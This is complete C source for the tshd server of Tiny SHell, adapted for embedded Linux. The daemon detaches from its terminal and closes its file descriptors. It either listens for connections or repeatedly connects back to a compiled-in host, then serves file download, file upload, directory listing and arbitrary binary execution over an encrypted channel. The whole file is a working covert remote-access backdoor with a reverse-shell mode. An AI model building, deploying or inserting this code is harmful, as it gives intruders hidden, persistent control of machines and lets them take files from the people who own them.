/*
 * Tiny SHell version 0.6 - server side,
 * by Christophe Devine <devine@cr0.net>;
 * this program is licensed under the GPL.
 *
 * Modified for embedded systems:
 * - Direct library calls for ls/get/put/exec
 * - Monocypher (X25519/Ed25519/ChaCha20-Poly1305) crypto layer
 * - Zero stdio formatted I/O and zero dynamic memory allocation
 * - SYS_getdents64 raw syscalls
 * - Adheres to Barr-C:2018 coding standards
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <signal.h>
#include <netinet/tcp.h>
#include <errno.h>

#include "tsh.h"
#include "pel.h"
#include "tsh_pubkey.h"

char *cb_host = CB_HOST;
int server_port = SERVER_PORT;

unsigned char message[BUFSIZE + 1];
extern char *optarg;
extern int optind;

/* Linux 64-bit directory entry struct for SYS_getdents64 */
struct linux_dirent64
{
    uint64_t       d_ino;
    int64_t        d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char           d_name[];
};

/* Function declarations */
int process_client( int client );
int tshd_get_file( int client );
int tshd_put_file( int client );
int tshd_ls_dir( int client );
int tshd_execv( int client );

/* Non-stdio string formatting helpers */

/**
 * \brief Appends a null-terminated string to a destination buffer.
 *
 * \param[out] dst Pointer to destination buffer where characters will be written.
 * \param[in]  src Pointer to null-terminated source string to copy.
 * \return Pointer to the position immediately following the last written character.
 */
static char *append_str( char *dst, const char *src )
{
    while( *src != '\0' )
    {
        *dst++ = *src++;
    }
    return dst;
}

/**
 * \brief Formats a 32-bit unsigned integer as a 6-character octal string.
 *
 * Used for formatting POSIX file permission mode bits without stdio.
 *
 * \param[out] dst Pointer to destination buffer of at least 6 bytes.
 * \param[in]  val Unsigned integer mode value to format.
 * \return Pointer to the buffer position immediately following the 6 octal digits.
 */
static char *append_octal6( char *dst, uint32_t val )
{
    int i;
    for( i = 5; i >= 0; i-- )
    {
        dst[i] = (char)( '0' + ( val & 0x7 ) );
        val >>= 3;
    }
    return dst + 6;
}

/**
 * \brief Formats a 64-bit unsigned integer as a base-10 ASCII string.
 *
 * Formats integers (e.g. UID, GID, file size) without relying on sprintf.
 *
 * \param[out] dst Pointer to destination buffer.
 * \param[in]  val 64-bit unsigned integer value to format.
 * \return Pointer to the buffer position immediately following the last written digit.
 */
static char *append_uint( char *dst, uint64_t val )
{
    char tmp[24];
    int i = 0;
    if( val == 0 )
    {
        *dst++ = '0';
        return dst;
    }

    while( val > 0 )
    {
        tmp[i++] = (char)( '0' + ( val % 10 ) );
        val /= 10;
    }

    while( i > 0 )
    {
        *dst++ = tmp[--i];
    }

    return dst;
}

/**
 * \brief Signal handler for SIGTERM and SIGINT.
 *
 * Terminates the server process cleanly.
 *
 * \param[in] sig Signal number received.
 */
static void sigterm_handler( int sig )
{
    (void) sig;
    exit( 0 );
}

/**
 * \brief Server entry point for tshd.
 *
 * Parses command-line arguments, sets up signal handlers, daemonizes unless
 * running in foreground, and enters either listening mode or connect-back loop.
 *
 * \param[in] argc Argument count.
 * \param[in] argv Argument vector.
 * \return 0 on normal exit, or non-zero error code on failure.
 */
int main( int argc, char *argv[] )
{
    int ret, pid;
    socklen_t n;
    int client;
    struct sockaddr_in client_addr;
    int foreground = 0;

    signal( SIGTERM, sigterm_handler );
    signal( SIGINT, sigterm_handler );
    signal( SIGPIPE, SIG_IGN );

    if( argc > 1 && strcmp( argv[1], "-f" ) == 0 )
    {
        foreground = 1;
    }

    if( !foreground )
    {
        /* fork into background */

        pid = fork();

        if( pid < 0 )
        {
            return( 1 );
        }

        if( pid != 0 )
        {
            return( 0 );
        }

        /* create a new session */

        if( setsid() < 0 )
        {
            return( 2 );
        }

        /* close all file descriptors */

        for( n = 0; n < 1024; n++ )
        {
#ifdef DEBUG
            if( n == 2 )
            {
                continue;
            }
#endif
            close( n );
        }
    }

#ifndef CB_MODE /* normal bind mode */
    struct sockaddr_in server_addr;
    int server;

    if( cb_host == NULL )
    {
        /* create a socket */

        server = socket( AF_INET, SOCK_STREAM, 0 );

        if( server < 0 )
        {
            return( 3 );
        }

        /* bind the server on the port the client will connect to */

        n = 1;

        ret = setsockopt( server, SOL_SOCKET, SO_REUSEADDR,
                          (void *) &n, sizeof( n ) );

        if( ret < 0 )
        {
            return( 4 );
        }

        server_addr.sin_family      = AF_INET;
        server_addr.sin_port        = htons( server_port );
        server_addr.sin_addr.s_addr = INADDR_ANY;

        ret = bind( server, (struct sockaddr *) &server_addr,
                    sizeof( server_addr ) );

        if( ret < 0 )
        {
            return( 5 );
        }

        if( listen( server, 5 ) < 0 )
        {
            return( 6 );
        }

        while( 1 )
        {
            /* wait for inbound connections */

            n = sizeof( client_addr );

            client = accept( server, (struct sockaddr *)
                             &client_addr, &n );

            if( client < 0 )
            {
                return( 7 );
            }

            ret = process_client( client );

            if( ret == 1 )
            {
                continue;
            }

            return( ret );
        }
    }
#else

    /* -c specified, connect back mode */

    while( 1 )
    {
        sleep( CONNECT_BACK_DELAY );

        if( cb_host == NULL )
        {
            continue;
        }

        memset( &client_addr, 0, sizeof( client_addr ) );
        client_addr.sin_family = AF_INET;
        client_addr.sin_port   = htons( server_port );

        /* parse client IPv4 address */
        if( inet_pton( AF_INET, cb_host, &client_addr.sin_addr ) <= 0 )
        {
            continue;
        }

        /* create a socket */

        client = socket( AF_INET, SOCK_STREAM, 0 );

        if( client < 0 )
        {
            continue;
        }

        /* try to connect back to the client */

        ret = connect( client, (struct sockaddr *) &client_addr,
                       sizeof( client_addr ) );

        if( ret < 0 )
        {
            close( client );
            continue;
        }

        ret = process_client( client );
        if( ret == 1 )
        {
            continue;
        }

        return( ret );
    }
#endif

    return( 0 );
}

/**
 * \brief Handles an incoming client connection and session loop.
 *
 * Forks worker processes, performs the cryptographic PEL handshake using
 * the server's embedded public key, configures socket timeouts and TCP_NODELAY,
 * and executes a persistent command dispatch loop until the client disconnects
 * or sends QUIT_SESSION.
 *
 * \param[in] client Connected client socket file descriptor.
 * \return 0 on success, or non-zero status code on error.
 */
int process_client( int client )
{
    int pid, ret, action;
    int len;

    /* fork a child to handle the connection */

    pid = fork();

    if( pid < 0 )
    {
        close( client );
        return( 1 );
    }

    if( pid != 0 )
    {
        waitpid( pid, NULL, 0 );
        close( client );
        return( 1 );
    }

    /* the child forks and then exits so that the grand-child's
     * father becomes init (this to avoid becoming a zombie) */

    pid = fork();

    if( pid < 0 )
    {
        return( 8 );
    }

    if( pid != 0 )
    {
        return( 9 );
    }

    /* setup the packet encryption layer */

    alarm( 20 );

    ret = pel_server_init( client, default_dev_pk );

    alarm( 0 );

    if( ret != PEL_SUCCESS )
    {
        shutdown( client, 2 );
        return( 10 );
    }

    struct timeval tv;
    tv.tv_sec = 300;
    tv.tv_usec = 0;
    setsockopt( client, SOL_SOCKET, SO_RCVTIMEO, (const char *) &tv, sizeof( tv ) );
    setsockopt( client, SOL_SOCKET, SO_SNDTIMEO, (const char *) &tv, sizeof( tv ) );
    int nodelay_flag = 1;
    setsockopt( client, IPPROTO_TCP, TCP_NODELAY, (void *) &nodelay_flag, sizeof( nodelay_flag ) );

    /* Persistent command dispatch loop */

    while( 1 )
    {
        ret = pel_recv_msg( client, message, &len );

        if( ret != PEL_SUCCESS || len != 1 )
        {
            break;
        }

        action = (int) message[0];

        if( action == QUIT_SESSION )
        {
            break;
        }

        switch( action )
        {
            case GET_FILE:
                ret = tshd_get_file( client );
                break;

            case PUT_FILE:
                ret = tshd_put_file( client );
                break;

            case LS_DIR:
                ret = tshd_ls_dir( client );
                break;

            case EXEC_BIN:
                ret = tshd_execv( client );
                break;

            default:
                ret = -1;
                break;
        }

        if( ret < 0 )
        {
            break;
        }
    }

    shutdown( client, 2 );
    close( client );
    return( 0 );
}

/**
 * \brief Handles a file download request from the client.
 *
 * Receives the target file path via PEL, opens the file, sends a 1-byte
 * status header (0 for success, 1 for error), streams its contents in chunks
 * up to BUFSIZE, and terminates the transfer with a 0-byte frame.
 *
 * \param[in] client Connected client socket file descriptor.
 * \return 0 on success, or -1 on unrecoverable network/protocol error.
 */
int tshd_get_file( int client )
{
    int ret, len, fd;
    unsigned char status;

    /* get the filename */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( -1 );
    }

    message[len] = '\0';

    /* open local file */

    fd = open( (char *) message, O_RDONLY );

    struct stat st;
    if( fd < 0 || fstat( fd, &st ) < 0 || S_ISDIR( st.st_mode ) )
    {
        if( fd >= 0 )
        {
            close( fd );
        }
        /* Status 1: file open error or directory, followed by 0-byte delimiter */
        status = 1;
        pel_send_msg( client, &status, 1 );
        pel_send_msg( client, (unsigned char *) "", 0 );
        return( 0 );
    }

    /* Status 0: success, followed by data chunks and 0-byte delimiter */
    status = 0;
    ret = pel_send_msg( client, &status, 1 );
    if( ret != PEL_SUCCESS )
    {
        close( fd );
        return( -1 );
    }

    /* send the data */

    while( 1 )
    {
        len = read( fd, message, BUFSIZE );

        if( len == 0 )
        {
            break;
        }

        if( len < 0 )
        {
            close( fd );
            pel_send_msg( client, (unsigned char *) "", 0 );
            return( 0 );
        }

        ret = pel_send_msg( client, message, len );

        if( ret != PEL_SUCCESS )
        {
            close( fd );
            return( -1 );
        }
    }

    close( fd );

    /* Send 0-byte frame to signal EOF */
    ret = pel_send_msg( client, (unsigned char *) "", 0 );
    if( ret != PEL_SUCCESS )
    {
        return( -1 );
    }

    return( 0 );
}

/**
 * \brief Handles a file upload request from the client.
 *
 * Receives the destination path via PEL, creates the target file, writes
 * incoming data chunks until a 0-byte frame is received, and sends a 1-byte
 * status response (0 for success, 1 for write/create failure).
 *
 * \param[in] client Connected client socket file descriptor.
 * \return 0 on success, or -1 on unrecoverable network/protocol error.
 */
int tshd_put_file( int client )
{
    int ret, len, fd;
    int write_error = 0;
    unsigned char status;

    /* get the filename */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( -1 );
    }

    message[len] = '\0';

    /* create local file */

    fd = creat( (char *) message, 0644 );

    if( fd < 0 )
    {
        write_error = 1;
    }

    /* fetch the data until 0-byte frame */

    while( 1 )
    {
        ret = pel_recv_msg( client, message, &len );

        if( ret != PEL_SUCCESS )
        {
            if( fd >= 0 )
            {
                close( fd );
            }
            return( -1 );
        }

        if( len == 0 )
        {
            /* 0-byte frame marks end of upload */
            break;
        }

        if( !write_error )
        {
            if( write( fd, message, len ) != len )
            {
                write_error = 1;
            }
        }
    }

    if( fd >= 0 )
    {
        close( fd );
    }

    status = (unsigned char)( write_error ? 1 : 0 );
    ret = pel_send_msg( client, &status, 1 );
    if( ret != PEL_SUCCESS )
    {
        return( -1 );
    }

    return( 0 );
}

/**
 * \brief Handles a directory listing request from the client.
 *
 * Receives the directory path via PEL, opens the directory, and iterates over
 * directory entries using the raw SYS_getdents64 syscall. File metadata (mode,
 * UID, GID, size, filename) is formatted into ASCII lines without stdio and
 * sent to the client. A 0-byte frame signals the end of the listing.
 *
 * \param[in] client Connected client socket file descriptor.
 * \return 0 on success, or -1 on unrecoverable network/protocol error.
 */
int tshd_ls_dir( int client )
{
    int ret, len, dfd;
    struct stat st;
    char line[512];
    char getdents_buf[512] __attribute__( ( aligned( 8 ) ) );
    int nread;

    /* get the directory path */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( -1 );
    }

    message[len] = '\0';

    /* open the directory */

    dfd = open( (char *) message, O_RDONLY | O_DIRECTORY );

    if( dfd < 0 )
    {
        /* Send 0-byte frame so client unblocks and sequence numbers stay aligned */
        pel_send_msg( client, (unsigned char *) "", 0 );
        return( 0 );
    }

    /* iterate through entries using SYS_getdents64 */

    while( ( nread = (int) syscall( SYS_getdents64, dfd, getdents_buf,
                                    sizeof( getdents_buf ) ) ) > 0 )
    {
        int bpos;
        for( bpos = 0; bpos < nread; )
        {
            struct linux_dirent64 *entry;
            entry = (struct linux_dirent64 *)( getdents_buf + bpos );
            char *p = line;

            if( fstatat( dfd, entry->d_name, &st, AT_SYMLINK_NOFOLLOW ) == 0 )
            {
                /* Format: mode owner group size name\n */
                p = append_octal6( p, (uint32_t) st.st_mode );
                *p++ = ' ';
                p = append_uint( p, (uint64_t) st.st_uid );
                *p++ = ' ';
                p = append_uint( p, (uint64_t) st.st_gid );
                *p++ = ' ';
                p = append_uint( p, (uint64_t) st.st_size );
                *p++ = ' ';
                p = append_str( p, entry->d_name );
                *p++ = '\n';
                *p = '\0';
            }
            else
            {
                p = append_str( p, "?????? ? ? ? " );
                p = append_str( p, entry->d_name );
                *p++ = '\n';
                *p = '\0';
            }

            ret = pel_send_msg( client, (unsigned char *) line,
                                (int)( p - line ) );

            if( ret != PEL_SUCCESS )
            {
                close( dfd );
                return( -1 );
            }

            bpos += entry->d_reclen;
        }
    }

    close( dfd );

    /* Send 0-byte frame to signal end of directory listing */
    ret = pel_send_msg( client, (unsigned char *) "", 0 );
    if( ret != PEL_SUCCESS )
    {
        return( -1 );
    }

    return( 0 );
}

/**
 * \brief Handles an executable command execution request from the client.
 *
 * Receives the command string via PEL, tokenizes arguments in-place using strtok_r,
 * forks a child process to execute the binary via execv, waits for termination, and
 * transmits the child's exit status code (1 byte) back to the client.
 *
 * \param[in] client Connected client socket file descriptor.
 * \return 0 on success, or -1 on unrecoverable network/protocol error.
 */
int tshd_execv( int client )
{
    int ret, len, pid, status;
    char *argv[64];
    int i = 0;
    unsigned char exit_code;
    char *saveptr = NULL;

    /* get the command line */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( -1 );
    }

    message[len] = '\0';

    /* parse directly on message buffer using reentrant strtok_r */

    char *token = strtok_r( (char *) message, " ", &saveptr );
    while( token != NULL && i < 63 )
    {
        argv[i++] = token;
        token = strtok_r( NULL, " ", &saveptr );
    }
    argv[i] = NULL;

    if( i == 0 )
    {
        exit_code = 127;
        pel_send_msg( client, &exit_code, 1 );
        return( 0 );
    }

    pid = fork();

    if( pid < 0 )
    {
        exit_code = 127;
        pel_send_msg( client, &exit_code, 1 );
        return( 0 );
    }

    if( pid == 0 )
    {
        /* child */

        close( client );

        execv( argv[0], argv );

        /* if execv returns, an error occurred */
        if( errno == ENOENT )
        {
            exit( 127 );
        }
        else if( errno == EACCES )
        {
            exit( 126 );
        }
        else
        {
            exit( 127 );
        }
    }
    else
    {
        /* parent */

        waitpid( pid, &status, 0 );

        if( WIFEXITED( status ) )
        {
            exit_code = (unsigned char) WEXITSTATUS( status );
        }
        else
        {
            exit_code = 255;
        }

        ret = pel_send_msg( client, &exit_code, 1 );
        if( ret != PEL_SUCCESS )
        {
            return( -1 );
        }
    }

    return( 0 );
}